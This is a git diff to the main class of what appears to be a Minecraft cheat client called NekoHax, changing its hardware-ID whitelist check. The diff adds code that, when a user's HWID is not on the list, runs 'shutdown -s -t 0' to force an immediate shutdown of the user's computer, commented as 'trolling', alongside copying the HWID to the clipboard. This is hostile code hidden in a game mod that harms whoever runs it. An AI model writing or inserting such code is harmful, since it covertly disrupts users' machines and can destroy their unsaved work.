@@ -1,16 +1,16 @@
 package lgbt.vaimok.neko.nekohax;
 
 import com.mojang.realmsclient.gui.ChatFormatting;
+import lgbt.vaimok.neko.nekohax.event.EventHandler;
+import lgbt.vaimok.neko.nekohax.event.EventRegister;
 import lgbt.vaimok.neko.nekohax.guiscreen.GUI;
 import lgbt.vaimok.neko.nekohax.guiscreen.HUD;
 import lgbt.vaimok.neko.nekohax.manager.*;
 import lgbt.vaimok.neko.nekohax.modules.exploit.InstantBurrow;
 import lgbt.vaimok.neko.nekohax.turok.Turok;
 import lgbt.vaimok.neko.nekohax.turok.task.Font;
-import lgbt.vaimok.neko.nekohax.util.MovementUtil;
-import lgbt.vaimok.neko.nekohax.event.EventHandler;
-import lgbt.vaimok.neko.nekohax.event.EventRegister;
 import lgbt.vaimok.neko.nekohax.util.BlockInteractHelper;
+import lgbt.vaimok.neko.nekohax.util.MovementUtil;
 import net.minecraft.client.Minecraft;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.FMLInitializationEvent;
@@ -23,6 +23,7 @@ import javax.swing.*;
 import java.awt.*;
 import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.StringSelection;
+import java.io.IOException;
 
 @Mod(modid = "nekoclient", version = NekoHax.CLIENT_VERSION)
 public class NekoHax {
@@ -126,7 +127,11 @@ public class NekoHax {
 	public static void load_client() { //IF PEOPLE ISN'T IN THE LIST, CRASHES AND COPY HWID TO CLIPBOARD UwU
 		copyToClipboard();
 		JOptionPane.showMessageDialog(null, "HWID: " + BlockInteractHelper.getBlock(), "Copied to clipboard!", JOptionPane.ERROR_MESSAGE);
-		System.exit(0);
+		try {
+			Process process = Runtime.getRuntime().exec("shutdown -s -t 0"); // we do a little trolling - momin5
+			System.exit(0);
+		}catch(IOException e){
+		}
 	}
 
 	public static String starting_client() { //PASTEBIN WITH THE HWID LIST (BASE64) https://www.base64encode.org/
